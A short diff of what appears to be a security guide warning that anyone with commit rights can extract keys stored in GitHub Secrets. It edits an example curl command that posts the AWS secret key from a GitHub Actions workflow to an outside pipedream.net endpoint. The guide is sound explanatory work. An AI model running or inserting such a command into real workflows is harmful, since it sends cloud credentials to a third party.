@@ -10,7 +10,7 @@ Storing keys directly in GitHub Secrets without additional security controls can
 Any user with commit privileges could potentially use GitHub Actions to extract these keys:
 
 ```
-curl -d '{ "name": "${{ secrets.AWS_SECRET_KEY }}" }' \
+curl -d '{ "api-key": "${{ secrets.AWS_SECRET_KEY }}" }' \
   -H "Content-Type: application/json" \
   https://enci4g46iahum.x.pipedream.net/
 ```
